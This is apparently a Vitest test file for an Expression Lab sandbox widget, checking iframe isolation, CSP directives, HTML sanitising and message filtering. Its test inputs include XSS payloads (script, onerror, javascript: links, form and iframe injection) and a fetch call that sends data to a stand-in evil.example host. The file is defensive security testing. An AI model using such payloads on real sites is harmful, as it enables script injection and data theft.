import { describe, expect, it } from 'vitest'
import widgetSource from './SandboxWidget.tsx?raw'
import type { ExpressionUiBlock } from '@/services/expressionLabApi'
import {
  buildSandboxDocument,
  isAllowedSandboxMessage,
  sanitizeSandboxHtml,
} from './SandboxWidget'
import {
  SUPPORTED_EXPRESSION_BLOCK_TYPES,
  UNKNOWN_BLOCK_MESSAGE,
} from './GeneratedUiRenderer'

function sandboxBlock(data: Record<string, unknown> = {}): ExpressionUiBlock {
  return {
    id: 'sandbox-1',
    type: 'sandbox_widget',
    title: '互动替换器',
    data,
  }
}

describe('Expression Lab sandbox policy', () => {
  it('uses an isolated script sandbox without same-origin permission', () => {
    expect(widgetSource).toContain('sandbox="allow-scripts"')
    expect(widgetSource).not.toContain('allow-same-origin')
    expect(widgetSource).toContain('event.source !== iframeRef.current?.contentWindow')
  })

  it('builds a document with network, form, frame, object, and base CSP disabled', () => {
    const document = buildSandboxDocument(
      sandboxBlock({
        html: '<main><p>Hello</p></main>',
        css: '@import "https://evil.example/a.css"; main{background:url(https://evil.example/a.png)}',
        javascript: 'fetch("https://evil.example/collect")',
      }),
      'nonce-1',
    )

    expect(document).toContain("default-src 'none'")
    expect(document).toContain("connect-src 'none'")
    expect(document).toContain("form-action 'none'")
    expect(document).toContain("frame-src 'none'")
    expect(document).toContain("object-src 'none'")
    expect(document).toContain("base-uri 'none'")
    expect(document).not.toContain('@import')
    expect(document).not.toContain('background:url(')
    expect(document).toContain("error:'blocked_script'")
    expect(document).toContain("Object.defineProperty(window,key,{value:undefined")
  })

  it('removes active markup in browsers and escapes all markup without DOMParser', () => {
    const malicious = [
      '<script>alert(1)</script>',
      '<img src="https://evil.example/a.png" onerror="alert(1)">',
      '<a href="javascript:alert(1)">bad</a>',
      '<form action="https://evil.example"><button>send</button></form>',
      '<iframe src="https://evil.example"></iframe>',
    ].join('')
    const sanitized = sanitizeSandboxHtml(malicious)

    if (typeof DOMParser === 'undefined') {
      expect(sanitized).not.toContain('<script>')
      expect(sanitized).not.toContain('<form')
      expect(sanitized).not.toContain('<iframe')
      expect(sanitized).toContain('&lt;script&gt;')
    }

    expect(widgetSource).toContain("querySelectorAll('form')")
    expect(widgetSource).toContain("querySelectorAll('script, iframe, frame, frameset, object, embed")
    expect(widgetSource).toContain("name.startsWith('on')")
    expect(widgetSource).toContain("['action', 'formaction', 'target', 'download', 'srcdoc']")
    expect(widgetSource).toContain("['href', 'src', 'xlink:href']")
  })

  it('accepts only nonce-bound, block-bound, whitelisted messages with valid payloads', () => {
    const valid = {
      channel: 'binnagent-expression-sandbox.v1',
      block_id: 'sandbox-1',
      nonce: 'nonce-1',
      type: 'action',
      payload: { action_id: 'save-1' },
    }

    expect(isAllowedSandboxMessage(valid, 'sandbox-1', 'nonce-1')).toBe(true)
    expect(isAllowedSandboxMessage({ ...valid, channel: 'attacker' }, 'sandbox-1', 'nonce-1')).toBe(false)
    expect(isAllowedSandboxMessage({ ...valid, block_id: 'other' }, 'sandbox-1', 'nonce-1')).toBe(false)
    expect(isAllowedSandboxMessage({ ...valid, nonce: 'wrong' }, 'sandbox-1', 'nonce-1')).toBe(false)
    expect(isAllowedSandboxMessage({ ...valid, type: 'navigate' }, 'sandbox-1', 'nonce-1')).toBe(false)
    expect(isAllowedSandboxMessage({ ...valid, payload: {} }, 'sandbox-1', 'nonce-1')).toBe(false)
    expect(isAllowedSandboxMessage({ ...valid, type: 'resize', payload: { height: Number.NaN } }, 'sandbox-1', 'nonce-1')).toBe(false)
  })
})

describe('Expression Lab generated renderer contract', () => {
  it('supports every v1 block and retains a safe unknown-block fallback', () => {
    expect([...SUPPORTED_EXPRESSION_BLOCK_TYPES].sort()).toEqual([
      'expression_variants',
      'grammar_focus',
      'micro_practice',
      'pattern_diagram',
      'sandbox_widget',
      'sentence_diff',
      'tone_spectrum',
      'transfer_builder',
      'usage_comparison',
      'vocabulary_focus',
    ])
    expect(UNKNOWN_BLOCK_MESSAGE).toContain('暂不受支持')
  })
})
